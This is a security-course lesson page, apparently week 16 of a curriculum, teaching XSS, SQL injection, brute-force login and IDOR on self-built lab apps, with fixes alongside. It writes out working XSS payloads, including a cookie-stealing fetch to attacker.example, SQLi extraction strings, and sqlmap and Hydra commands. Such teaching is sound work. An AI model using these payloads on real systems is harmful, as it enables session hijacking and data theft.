---
layout: page
title: "Web Exploitation: XSS and SQL Injection"
week_number: "16"
release_date: "2026-08-04"
phase_label: "Phase 3"
phase_name: "Cybersecurity Foundations"
phase_color: "#f72585"
permalink: /week-16/
---

> Week 16. XSS and SQL injection -- the two most common web vulnerabilities.
> 
> You already know what these are from the OWASP week. This week you build working demos of each.
> 
> Setup: you will need a simple local web server. Install Flask: pip3 install flask. Each activity includes a vulnerable app you run locally.
> 
> Reminder: these techniques are only legal on systems you own or have explicit permission to test. The activities this week use apps you build yourself.

---

# Web Exploitation Techniques

**Pillar:** Cybersecurity
**Level:** Intermediate
**Read time:** 20 minutes
**Prerequisite:** `beginner/02_owasp-top10.md`

## Scope

Practical exploitation of the most common web vulnerabilities in controlled lab environments. All examples are for isolated test apps only. See `ETHICS.md`.

---

## Cross-Site Scripting (XSS)

XSS injects JavaScript into a page served to another user's browser. The script runs with the victim's session.

### Three types

| Type | How it persists | Example |
|------|----------------|---------|
| Reflected | Does not persist; victim must click a crafted link | Search result page echoing the query |
| Stored | Saved in the database; runs for every visitor | Blog comment with `<script>` in it |
| DOM-based | Never hits the server; triggered by client-side JS reading `location.hash` | Single-page app reading URL fragment |

### Basic payloads (lab only)

```html
<!-- Confirm execution -->
<script>alert(document.domain)</script>

<!-- Cookie theft (requires no HttpOnly flag) -->
<script>fetch('https://attacker.example/c?d='+document.cookie)</script>

<!-- Bypass simple filters -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
```

### Fix

```python
# Never do this
return f"<p>Hello {username}</p>"

# Do this (Jinja2 auto-escapes by default)
return render_template("hello.html", username=username)

# Also set Content Security Policy header
response.headers["Content-Security-Policy"] = "default-src 'self'"
```

---

## SQL Injection (SQLi)

SQL injection passes attacker-controlled input to a database query, altering its logic.

### Detection

Try these inputs in any field that might query a database:
```
'
''
' OR '1'='1
' OR 1=1--
```

If the app behaves differently (error, different data, longer response), it may be injectable.

### In-band extraction

```sql
-- UNION-based: requires knowing column count
' UNION SELECT null, username, password FROM users--

-- Error-based: extract data through error messages
' AND extractvalue(1, concat(0x7e, (SELECT version())))--
```

### Blind SQLi

When there is no visible output, infer data from true/false responses:

```sql
-- Does the first character of the admin password equal 'a'?
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

### Fix

```python
# Vulnerable
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")

# Parameterised (safe)
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))

# ORM (also safe, handles parameterisation)
User.query.filter_by(name=name).first()
```

### SQLmap (lab use only)

```bash
sqlmap -u "http://localhost:5000/user?id=1" --dbs --batch
```

---

## Broken Authentication

Exploiting weak session management or login controls.

### Session hijacking

If a session token is in a cookie without `HttpOnly`, XSS can steal it:
```javascript
document.cookie  // returns "session=eyJhbGci..."
```

Replay the stolen cookie in Burp Suite to hijack the session.

### Brute force login

```bash
# Hydra against a form POST
hydra -L users.txt -P rockyou.txt http-post-form \
  "localhost:5000/login:username=^USER^&password=^PASS^:Invalid credentials" -t 4
```

**What to defend:** Rate limit (5 attempts, then lockout + CAPTCHA). MFA. Account lockout alerts.

---

## Insecure Direct Object Reference (IDOR)

Changing an ID in a URL or API call to access another user's data.

```
GET /api/orders/1001   -> your order
GET /api/orders/1002   -> someone else's order (returns 200 instead of 403)
```

**Detection:** Change numeric IDs, UUIDs, and usernames in any request. Use Burp Suite to intercept and modify.

**Fix:** Always check `order.user_id == current_user.id` server-side before returning data.

---

## Using Burp Suite for Manual Testing

1. Open Burp Suite, go to Proxy > Intercept > Open Browser
2. Browse to your target app; Burp captures all requests
3. Right-click any request: "Send to Repeater" to replay with modifications
4. Right-click any parameter: "Send to Intruder" for automated fuzzing

Key views:
- **Repeater**: manually modify and replay single requests
- **Intruder**: automate parameter fuzzing with a wordlist
- **Decoder**: base64/URL encode and decode payloads
- **Logger**: full history of every request made

## Checklist

- [ ] Successfully trigger a stored XSS in the `activities/cybersecurity/medium/01_xss-demo.md` lab
- [ ] Extract data from a vulnerable query using UNION-based SQLi in the SQLi playground lab
- [ ] Intercept and modify a request in Burp Suite Repeater
- [ ] Identify an IDOR in any lab app by changing a numeric ID in the URL

## Next Steps

- Lab: `activities/cybersecurity/medium/01_xss-demo.md`
- Lab: `activities/cybersecurity/medium/03_sqli-playground.md`
- Guide: `advanced/01_pentesting-methodology.md`

---

## Activity: XSS Demo Lab

1. Open the activity at activities/cybersecurity/medium/01_xss-demo.md
1. Build the vulnerable Flask app from the activity instructions
1. Demonstrate all 3 types of XSS: Reflected (payload in URL parameter), Stored (payload saved to a list and rendered on the page), DOM-based (payload read from URL hash by JavaScript)
1. For each type, write a payload that pops an alert() with the message 'XSS by Braeden'
1. Then fix each vulnerability using the correct mitigation (html.escape() for reflected/stored, textContent for DOM-based)
1. You know you are done when: all 3 XSS types work, all 3 fixes prevent the payload, and you can explain why each fix works

---

## Check-in Questions

Write your answers down before your next session.

1. What is the difference between reflected and stored XSS?
2. Why does innerHTML = userInput create an XSS vulnerability but textContent = userInput does not?
3. What is a prepared statement (parameterised query) and why does it prevent SQL injection?
4. An attacker finds an XSS in a site. List 3 things they could do with it.
